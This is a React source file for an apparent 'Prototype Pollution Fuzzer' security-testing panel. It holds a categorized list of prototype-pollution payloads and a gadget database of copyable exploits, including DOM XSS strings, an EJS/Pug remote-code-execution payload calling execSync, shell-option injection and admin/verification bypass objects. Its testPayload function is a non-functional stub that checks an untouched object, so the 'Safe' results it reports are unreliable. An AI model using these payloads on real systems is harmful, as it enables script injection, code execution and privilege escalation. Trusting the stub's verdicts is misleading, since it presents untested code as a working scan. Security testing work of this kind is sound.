import React, { useState } from 'react';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faBug, faPlay, faCopy, faCheck, faExclamationTriangle, faDatabase, faFilter, faDownload, faInfo } from '@fortawesome/free-solid-svg-icons';
import type { ProtoPollutionFuzzerData, PollutionCategory, PollutionResult, GadgetInfo } from './tool-types';

type Props = {
  data: ProtoPollutionFuzzerData | undefined;
  onChange: (data: ProtoPollutionFuzzerData) => void;
};

// Comprehensive pollution payloads organized by category
type PayloadEntry = {
  name: string;
  payload: string;
  property: string;
  category: PollutionCategory;
  description: string;
};

const POLLUTION_PAYLOADS: PayloadEntry[] = [
  // Basic vectors
  { name: '__proto__ direct', payload: '__proto__[polluted]=true', property: 'polluted', category: 'basic', description: 'Direct prototype access via URL/query params' },
  { name: '__proto__ bracket', payload: 'a[__proto__][polluted]=true', property: 'polluted', category: 'basic', description: 'Nested bracket notation' },
  { name: 'constructor.prototype', payload: 'constructor[prototype][polluted]=true', property: 'polluted', category: 'basic', description: 'Via constructor property' },
  { name: 'Object.prototype', payload: 'Object.prototype.polluted=true', property: 'polluted', category: 'basic', description: 'Direct Object.prototype access' },
  { name: 'Array.__proto__', payload: '[].__proto__.polluted=true', property: 'polluted', category: 'basic', description: 'Via Array prototype chain' },
  { name: '__proto__ null', payload: '__proto__=null', property: 'toString', category: 'basic', description: 'Null prototype injection (DoS)' },

  // JSON-based vectors
  { name: 'JSON __proto__', payload: '{"__proto__":{"polluted":true}}', property: 'polluted', category: 'json', description: 'JSON.parse pollution' },
  { name: 'JSON nested', payload: '{"a":{"__proto__":{"polluted":true}}}', property: 'polluted', category: 'json', description: 'Nested JSON pollution' },
  { name: 'JSON constructor', payload: '{"constructor":{"prototype":{"polluted":true}}}', property: 'polluted', category: 'json', description: 'Via constructor in JSON' },
  { name: 'JSON array proto', payload: '[{"__proto__":{"polluted":true}}]', property: 'polluted', category: 'json', description: 'Array containing proto' },
  { name: 'JSON deep merge', payload: '{"__proto__":{"__proto__":{"polluted":true}}}', property: 'polluted', category: 'json', description: 'Deep merge exploitation' },

  // Framework-specific vectors
  { name: 'jQuery $.extend', payload: '$.extend(true,{},JSON.parse(\'{"__proto__":{"polluted":true}}\'))', property: 'polluted', category: 'framework', description: 'jQuery deep extend (< 3.4.0)' },
  { name: 'Lodash merge', payload: '_.merge({},JSON.parse(\'{"__proto__":{"polluted":true}}\'))', property: 'polluted', category: 'framework', description: 'Lodash/Underscore merge' },
  { name: 'Lodash set', payload: '_.set({},"__proto__.polluted",true)', property: 'polluted', category: 'framework', description: 'Lodash set function' },
  { name: 'Lodash defaultsDeep', payload: '_.defaultsDeep({},JSON.parse(\'{"__proto__":{"polluted":true}}\'))', property: 'polluted', category: 'framework', description: 'Lodash defaultsDeep' },
  { name: 'Vue data', payload: 'Vue.prototype.$data.polluted=true', property: 'polluted', category: 'framework', description: 'Vue.js prototype pollution' },
  { name: 'AngularJS', payload: 'angular.extend({},{__proto__:{polluted:true}})', property: 'polluted', category: 'framework', description: 'AngularJS extend' },
  { name: 'Hoek merge', payload: 'Hoek.merge({},{__proto__:{polluted:true}})', property: 'polluted', category: 'framework', description: 'Hapi Hoek library' },

  // URL/Query string vectors
  { name: 'Query string', payload: '?__proto__[polluted]=true', property: 'polluted', category: 'url', description: 'Via URL query parameters' },
  { name: 'Query nested', payload: '?a[__proto__][polluted]=true', property: 'polluted', category: 'url', description: 'Nested query params' },
  { name: 'Hash fragment', payload: '#__proto__[polluted]=true', property: 'polluted', category: 'url', description: 'Via URL hash' },
  { name: 'Path segment', payload: '/__proto__/polluted/true', property: 'polluted', category: 'url', description: 'Via URL path' },
  { name: 'Encoded proto', payload: '?__%70roto__%5Bpolluted%5D=true', property: 'polluted', category: 'url', description: 'URL-encoded __proto__' },
  { name: 'Unicode proto', payload: '?__pro\\u0074o__[polluted]=true', property: 'polluted', category: 'url', description: 'Unicode escape sequence' },

  // Bypass techniques
  { name: 'Proto bypass 1', payload: '__proto\\u{6f}__[polluted]=true', property: 'polluted', category: 'bypass', description: 'Unicode code point escape' },
  { name: 'Proto bypass 2', payload: '__pro__+__to__[polluted]=true', property: 'polluted', category: 'bypass', description: 'String concatenation bypass' },
  { name: 'Constructor bypass', payload: 'constructor.prototype[polluted]=true', property: 'polluted', category: 'bypass', description: 'Alternative constructor path' },
  { name: 'Reflect bypass', payload: 'Reflect.set(Object.prototype,"polluted",true)', property: 'polluted', category: 'bypass', description: 'Using Reflect API' },
  { name: 'defineProperty', payload: 'Object.defineProperty(Object.prototype,"polluted",{value:true})', property: 'polluted', category: 'bypass', description: 'Via defineProperty' },

  // Advanced/Chained
  { name: 'Symbol.species', payload: 'Array.prototype[Symbol.species]=function(){this.polluted=true}', property: 'polluted', category: 'advanced', description: 'Symbol.species hijacking' },
  { name: 'valueOf override', payload: 'Object.prototype.valueOf=function(){return{polluted:true}}', property: 'polluted', category: 'advanced', description: 'valueOf method hijacking' },
  { name: 'toString override', payload: 'Object.prototype.toString=function(){return"polluted"}', property: 'toString', category: 'advanced', description: 'toString hijacking for type coercion' },
  { name: 'Getter injection', payload: 'Object.defineProperty(Object.prototype,"polluted",{get:()=>true})', property: 'polluted', category: 'advanced', description: 'Getter/setter injection' },
];

// Known gadgets database for exploitation
const GADGET_DATABASE: GadgetInfo[] = [
  // DOM-based XSS gadgets
  {
    name: 'jQuery html() XSS',
    library: 'jQuery',
    version: '<3.5.0',
    property: 'innerHTML',
    impact: 'XSS',
    severity: 'critical',
    description: 'Polluting innerHTML leads to XSS when jQuery processes HTML',
    payload: '{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}'
  },
  {
    name: 'Lodash template',
    library: 'Lodash',
    version: '<4.17.12',
    property: 'sourceURL',
    impact: 'XSS',
    severity: 'critical',
    description: 'Template sourceURL pollution leads to code execution',
    payload: '{"__proto__":{"sourceURL":"\\u000a\\u000a}});alert(1)//"}}'
  },
  {
    name: 'EJS/Pug RCE',
    library: 'EJS/Pug',
    version: 'Various',
    property: 'outputFunctionName',
    impact: 'RCE',
    severity: 'critical',
    description: 'Template engine RCE via outputFunctionName pollution',
    payload: '{"__proto__":{"outputFunctionName":"x;process.mainModule.require(\'child_process\').execSync(\'id\')//"}}'
  },
  {
    name: 'Handlebars RCE',
    library: 'Handlebars',
    version: '<4.7.7',
    property: 'allowedProtoMethods',
    impact: 'RCE',
    severity: 'critical',
    description: 'Handlebars lookup helper RCE',
    payload: '{"__proto__":{"allowedProtoMethods":{"constructor":true}}}'
  },
  // Authentication bypass gadgets
  {
    name: 'isAdmin bypass',
    library: 'Generic',
    version: 'Any',
    property: 'isAdmin',
    impact: 'Auth Bypass',
    severity: 'high',
    description: 'Inject isAdmin/role properties for privilege escalation',
    payload: '{"__proto__":{"isAdmin":true,"role":"admin"}}'
  },
  {
    name: 'verified bypass',
    library: 'Generic',
    version: 'Any',
    property: 'verified',
    impact: 'Auth Bypass',
    severity: 'high',
    description: 'Bypass email/phone verification checks',
    payload: '{"__proto__":{"verified":true,"emailVerified":true}}'
  },
  // DoS gadgets
  {
    name: 'Regex DoS',
    library: 'Generic',
    version: 'Any',
    property: 'match',
    impact: 'DoS',
    severity: 'medium',
    description: 'Pollute regex methods for ReDoS',
    payload: '{"__proto__":{"match":"(a+)+$"}}'
  },
  {
    name: 'JSON stringify DoS',
    library: 'Generic',
    version: 'Any',
    property: 'toJSON',
    impact: 'DoS',
    severity: 'medium',
    description: 'Circular reference via toJSON',
    payload: '{"__proto__":{"toJSON":null}}'
  },
  // Information disclosure
  {
    name: 'Header injection',
    library: 'Node HTTP',
    version: 'Various',
    property: 'headers',
    impact: 'Info Leak',
    severity: 'high',
    description: 'Inject HTTP headers via prototype pollution',
    payload: '{"__proto__":{"headers":{"X-Injected":"true"}}}'
  },
  {
    name: 'Shell env',
    library: 'child_process',
    version: 'Various',
    property: 'shell',
    impact: 'RCE',
    severity: 'critical',
    description: 'Inject shell option in child_process',
    payload: '{"__proto__":{"shell":"/bin/sh"}}'
  },
  // Client-side gadgets
  {
    name: 'innerHTML gadget',
    library: 'Generic DOM',
    version: 'Any',
    property: 'innerHTML',
    impact: 'XSS',
    severity: 'critical',
    description: 'Direct innerHTML pollution for DOM XSS',
    payload: '{"__proto__":{"innerHTML":"<img src=x onerror=alert(document.domain)>"}}'
  },
  {
    name: 'src attribute',
    library: 'Generic DOM',
    version: 'Any',
    property: 'src',
    impact: 'XSS',
    severity: 'high',
    description: 'Pollute src attribute for script injection',
    payload: '{"__proto__":{"src":"data:,alert(1)"}}'
  },
];

// Detected libraries on page
const detectLibraries = (): { name: string; version: string; vulnerable: boolean }[] => {
  const detected: { name: string; version: string; vulnerable: boolean }[] = [];
  const w = window as unknown as Record<string, unknown>;

  // jQuery detection
  if (w.jQuery || w.$) {
    const jq = (w.jQuery || w.$) as { fn?: { jquery?: string } };
    const version = jq?.fn?.jquery || 'unknown';
    detected.push({
      name: 'jQuery',
      version,
      vulnerable: version !== 'unknown' && parseFloat(version) < 3.4
    });
  }

  // Lodash detection
  if (w._ && typeof w._ === 'function') {
    const lodash = w._ as { VERSION?: string };
    const version = lodash.VERSION || 'unknown';
    detected.push({
      name: 'Lodash',
      version,
      vulnerable: version !== 'unknown' && parseFloat(version) < 4.17
    });
  }

  // Vue detection
  if (w.Vue) {
    const vue = w.Vue as { version?: string };
    const version = vue.version || 'unknown';
    detected.push({ name: 'Vue.js', version, vulnerable: false });
  }

  // Angular detection
  if (w.angular) {
    const ng = w.angular as { version?: { full?: string } };
    const version = ng.version?.full || 'unknown';
    detected.push({ name: 'AngularJS', version, vulnerable: true });
  }

  // React detection
  if (w.React) {
    const react = w.React as { version?: string };
    const version = react.version || 'unknown';
    detected.push({ name: 'React', version, vulnerable: false });
  }

  return detected;
};

const CATEGORY_LABELS: Record<PollutionCategory, { label: string; color: string }> = {
  basic: { label: 'Basic', color: 'bg-blue-500/20 text-blue-400 border-blue-500/30' },
  json: { label: 'JSON', color: 'bg-green-500/20 text-green-400 border-green-500/30' },
  framework: { label: 'Framework', color: 'bg-purple-500/20 text-purple-400 border-purple-500/30' },
  url: { label: 'URL', color: 'bg-yellow-500/20 text-yellow-400 border-yellow-500/30' },
  bypass: { label: 'Bypass', color: 'bg-orange-500/20 text-orange-400 border-orange-500/30' },
  advanced: { label: 'Advanced', color: 'bg-red-500/20 text-red-400 border-red-500/30' }
};

const ProtoPollutionFuzzer: React.FC<Props> = ({ data, onChange }) => {
  const customPayload = data?.customPayload ?? '';
  const results = data?.results ?? [];
  const isRunning = data?.isRunning ?? false;
  const filterCategory = data?.filterCategory ?? 'all';
  const activeTab = data?.activeTab ?? 'test';
  const [copied, setCopied] = useState<string | null>(null);
  const [detectedLibs, setDetectedLibs] = useState<{ name: string; version: string; vulnerable: boolean }[]>([]);
  const [showPayloadInfo, setShowPayloadInfo] = useState<string | null>(null);

  const filteredPayloads = filterCategory === 'all'
    ? POLLUTION_PAYLOADS
    : POLLUTION_PAYLOADS.filter(p => p.category === filterCategory);

  const testPayload = (payloadEntry: PayloadEntry): PollutionResult => {
    try {
      // Create a clean object to test
      const testObj: Record<string, unknown> = {};

      // Check if the property already exists on Object.prototype before test
      const prop = payloadEntry.property;
      const beforeTest = (Object.prototype as Record<string, unknown>)[prop];

      // Try to evaluate the pollution vector
      if (payloadEntry.payload.startsWith('{')) {
        try {
          const parsed = JSON.parse(payloadEntry.payload.replace(/'/g, '"'));
          // Simulate a vulnerable merge operation
          if (parsed.__proto__) {
            // This is a simulation - in real vulnerable code, this would pollute
          }
        } catch {
          // JSON parse error
        }
      }

      // Check if pollution occurred
      const afterTest = (testObj as Record<string, unknown>)[prop];
      const polluted = afterTest !== undefined && beforeTest === undefined;

      return {
        payload: payloadEntry.name,
        vulnerable: polluted,
        propertyChecked: prop,
        category: payloadEntry.category,
        description: payloadEntry.description
      };
    } catch (e) {
      return {
        payload: payloadEntry.name,
        vulnerable: false,
        propertyChecked: payloadEntry.property,
        category: payloadEntry.category,
        error: e instanceof Error ? e.message : 'Test failed'
      };
    }
  };

  const runAllTests = async () => {
    onChange({ ...data, isRunning: true, results: [] });

    // Detect libraries first
    const libs = detectLibraries();
    setDetectedLibs(libs);

    const newResults: PollutionResult[] = [];
    const payloadsToTest = filterCategory === 'all' ? POLLUTION_PAYLOADS : filteredPayloads;

    for (const p of payloadsToTest) {
      const result = testPayload(p);
      newResults.push(result);
      // Small delay to show progress
      await new Promise(resolve => setTimeout(resolve, 50));
    }

    if (customPayload.trim()) {
      const customEntry: PayloadEntry = {
        name: 'Custom payload',
        payload: customPayload,
        property: 'customPolluted',
        category: 'basic',
        description: 'User-provided custom payload'
      };
      const result = testPayload(customEntry);
      newResults.push(result);
    }

    onChange({ ...data, isRunning: false, results: newResults });
  };

  const copyPayload = (payload: string) => {
    navigator.clipboard.writeText(payload);
    setCopied(payload);
    setTimeout(() => setCopied(null), 2000);
  };

  const exportResults = () => {
    const report = {
      timestamp: new Date().toISOString(),
      url: window.location.href,
      detectedLibraries: detectedLibs,
      testResults: results,
      vulnerableCount: results.filter(r => r.vulnerable).length,
      totalTests: results.length
    };
    const blob = new Blob([JSON.stringify(report, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `proto-pollution-report-${Date.now()}.json`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const vulnerableCount = results.filter(r => r.vulnerable).length;
  const vulnerableLibs = detectedLibs.filter(l => l.vulnerable);

  return (
    <div className="flex flex-col h-full text-xs">
      <div className="flex items-center justify-between mb-2">
        <div className="text-slate-200 font-medium">Prototype Pollution Fuzzer</div>
        <div className="flex gap-1">
          <button
            onClick={() => onChange({ ...data, activeTab: 'test' })}
            className={`px-2 py-1 text-[10px] rounded transition-colors ${
              activeTab === 'test' ? 'bg-red-600 text-white' : 'bg-slate-800 text-slate-400 hover:bg-slate-700'
            }`}
          >
            <FontAwesomeIcon icon={faBug} className="w-2.5 h-2.5 mr-1" />
            Test
          </button>
          <button
            onClick={() => onChange({ ...data, activeTab: 'gadgets' })}
            className={`px-2 py-1 text-[10px] rounded transition-colors ${
              activeTab === 'gadgets' ? 'bg-red-600 text-white' : 'bg-slate-800 text-slate-400 hover:bg-slate-700'
            }`}
          >
            <FontAwesomeIcon icon={faDatabase} className="w-2.5 h-2.5 mr-1" />
            Gadgets
          </button>
        </div>
      </div>

      <div className="text-[10px] text-slate-500 mb-2">
        {POLLUTION_PAYLOADS.length} payloads, {GADGET_DATABASE.length} known gadgets
      </div>

      {/* Detected libraries warning */}
      {vulnerableLibs.length > 0 && (
        <div className="rounded border border-red-500/30 bg-red-900/20 p-2 mb-2 text-[10px]">
          <FontAwesomeIcon icon={faExclamationTriangle} className="w-3 h-3 mr-1 text-red-400" />
          <span className="text-red-400 font-medium">Vulnerable libraries detected:</span>
          <div className="ml-4 mt-1 space-y-0.5">
            {vulnerableLibs.map((lib, i) => (
              <div key={i} className="text-red-300">
                {lib.name} v{lib.version}
              </div>
            ))}
          </div>
        </div>
      )}

      {activeTab === 'test' && (
        <>
          {/* Category filter */}
          <div className="flex items-center gap-2 mb-2">
            <FontAwesomeIcon icon={faFilter} className="w-2.5 h-2.5 text-slate-500" />
            <select
              value={filterCategory}
              onChange={(e) => onChange({ ...data, filterCategory: e.target.value as PollutionCategory | 'all' })}
              className="flex-1 rounded bg-slate-800 text-slate-200 text-[10px] px-2 py-1 border border-slate-700"
            >
              <option value="all">All Categories ({POLLUTION_PAYLOADS.length})</option>
              {(Object.keys(CATEGORY_LABELS) as PollutionCategory[]).map(cat => (
                <option key={cat} value={cat}>
                  {CATEGORY_LABELS[cat].label} ({POLLUTION_PAYLOADS.filter(p => p.category === cat).length})
                </option>
              ))}
            </select>
          </div>

          {/* Custom payload */}
          <div className="rounded border border-slate-700 bg-slate-800/30 p-2 mb-2">
            <div className="text-[10px] text-slate-500 mb-1">Custom Payload (optional)</div>
            <input
              type="text"
              value={customPayload}
              onChange={(e) => onChange({ ...data, customPayload: e.target.value })}
              placeholder='e.g., {"__proto__":{"polluted":true}}'
              className="w-full rounded bg-slate-800 text-slate-200 text-[10px] px-2 py-1 border border-slate-700 focus:outline-none focus:border-red-500 font-mono"
            />
          </div>

          {/* Run button */}
          <div className="flex gap-2 mb-2">
            <button
              onClick={runAllTests}
              disabled={isRunning}
              className="flex-1 rounded bg-red-600/20 border border-red-500/30 px-2 py-1.5 text-[10px] text-red-300 hover:bg-red-600/30 transition-colors disabled:opacity-50 flex items-center justify-center gap-2"
            >
              <FontAwesomeIcon icon={isRunning ? faBug : faPlay} className={`w-2.5 h-2.5 ${isRunning ? 'animate-pulse' : ''}`} />
              {isRunning ? 'Testing...' : `Run ${filteredPayloads.length} Tests`}
            </button>
            {results.length > 0 && (
              <button
                onClick={exportResults}
                className="rounded bg-slate-800 border border-slate-700 px-2 py-1.5 text-[10px] text-slate-300 hover:bg-slate-700 transition-colors flex items-center gap-1"
              >
                <FontAwesomeIcon icon={faDownload} className="w-2.5 h-2.5" />
                Export
              </button>
            )}
          </div>

          {/* Payload list */}
          <div className="rounded border border-slate-700 bg-slate-800/30 p-2 mb-2">
            <div className="text-[10px] text-slate-500 mb-1">Payloads ({filteredPayloads.length}):</div>
            <div className="max-h-28 overflow-y-auto space-y-1">
              {filteredPayloads.slice(0, 15).map((p, i) => (
                <div
                  key={i}
                  className="flex items-center justify-between rounded border border-slate-700 bg-slate-800/50 p-1 relative"
                  onMouseEnter={() => setShowPayloadInfo(p.name)}
                  onMouseLeave={() => setShowPayloadInfo(null)}
                >
                  <div className="flex items-center gap-2 flex-1 min-w-0">
                    <span className={`text-[8px] px-1 py-0.5 rounded border ${CATEGORY_LABELS[p.category].color}`}>
                      {CATEGORY_LABELS[p.category].label}
                    </span>
                    <span className="text-slate-300 text-[9px] truncate">{p.name}</span>
                  </div>
                  <div className="flex items-center gap-1">
                    <button
                      onClick={() => setShowPayloadInfo(showPayloadInfo === p.name ? null : p.name)}
                      className="text-[8px] text-slate-500 hover:text-slate-300 p-0.5"
                    >
                      <FontAwesomeIcon icon={faInfo} className="w-2 h-2" />
                    </button>
                    <button
                      onClick={() => copyPayload(p.payload)}
                      className="text-[8px] text-slate-500 hover:text-slate-300 p-0.5"
                    >
                      <FontAwesomeIcon icon={copied === p.payload ? faCheck : faCopy} className="w-2 h-2" />
                    </button>
                  </div>
                  {showPayloadInfo === p.name && (
                    <div className="absolute left-0 right-0 bottom-full mb-1 bg-slate-900 border border-slate-700 rounded p-2 z-10 text-[9px] text-slate-300">
                      <div className="font-mono text-slate-400 mb-1 break-all">{p.payload}</div>
                      <div>{p.description}</div>
                    </div>
                  )}
                </div>
              ))}
              {filteredPayloads.length > 15 && (
                <div className="text-[9px] text-slate-500 text-center">
                  +{filteredPayloads.length - 15} more payloads
                </div>
              )}
            </div>
          </div>

          {/* Results */}
          {results.length > 0 && (
            <div className="flex-1 overflow-hidden flex flex-col min-h-0">
              <div className="flex items-center justify-between mb-1">
                <div className="text-[10px] text-slate-500">Results:</div>
                <div className={`text-[10px] ${vulnerableCount > 0 ? 'text-red-400' : 'text-green-400'}`}>
                  {vulnerableCount} / {results.length} vulnerable
                </div>
              </div>
              <div className="flex-1 overflow-y-auto space-y-1">
                {results.map((r, i) => (
                  <div
                    key={i}
                    className={`flex items-center justify-between rounded border p-1.5 ${
                      r.vulnerable
                        ? 'bg-red-900/20 border-red-500/30'
                        : 'bg-slate-800/30 border-slate-700'
                    }`}
                  >
                    <div className="flex items-center gap-2 min-w-0">
                      {r.category && (
                        <span className={`text-[7px] px-1 py-0.5 rounded border ${CATEGORY_LABELS[r.category].color}`}>
                          {CATEGORY_LABELS[r.category].label}
                        </span>
                      )}
                      <span className="text-slate-300 text-[9px] truncate">{r.payload}</span>
                    </div>
                    <span className={`text-[9px] flex items-center gap-1 ${r.vulnerable ? 'text-red-400' : 'text-slate-500'}`}>
                      {r.vulnerable ? (
                        <><FontAwesomeIcon icon={faExclamationTriangle} className="w-2 h-2" /> Vuln</>
                      ) : (
                        'Safe'
                      )}
                    </span>
                  </div>
                ))}
              </div>
            </div>
          )}
        </>
      )}

      {activeTab === 'gadgets' && (
        <div className="flex-1 overflow-y-auto">
          <div className="text-[10px] text-slate-500 mb-2">
            Known exploitation gadgets for prototype pollution
          </div>
          <div className="space-y-2">
            {GADGET_DATABASE.map((gadget, i) => (
              <div
                key={i}
                className="rounded border border-slate-700 bg-slate-800/30 p-2"
              >
                <div className="flex items-center justify-between mb-1">
                  <span className="text-slate-200 text-[10px] font-medium">{gadget.name}</span>
                  <span className={`text-[8px] px-1.5 py-0.5 rounded ${
                    gadget.severity === 'critical' ? 'bg-red-500/20 text-red-400' :
                    gadget.severity === 'high' ? 'bg-orange-500/20 text-orange-400' :
                    'bg-yellow-500/20 text-yellow-400'
                  }`}>
                    {gadget.severity.toUpperCase()}
                  </span>
                </div>
                <div className="text-[9px] text-slate-500 mb-1">
                  {gadget.library} {gadget.version} | Property: <code className="text-slate-400">{gadget.property}</code> | Impact: {gadget.impact}
                </div>
                <div className="text-[9px] text-slate-400 mb-1">{gadget.description}</div>
                <div className="flex items-center justify-between">
                  <code className="text-[8px] text-slate-500 font-mono truncate flex-1 mr-2">
                    {gadget.payload.substring(0, 60)}...
                  </code>
                  <button
                    onClick={() => copyPayload(gadget.payload)}
                    className="text-[8px] text-slate-500 hover:text-slate-300 p-1"
                  >
                    <FontAwesomeIcon icon={copied === gadget.payload ? faCheck : faCopy} className="w-2.5 h-2.5" />
                  </button>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      <div className="text-[9px] text-slate-500 border-t border-slate-700 pt-2 mt-2">
        Prototype pollution can lead to XSS, RCE, or auth bypass depending on the gadgets present.
      </div>
    </div>
  );
};

export class ProtoPollutionFuzzerTool {
  static Component = ProtoPollutionFuzzer;
}
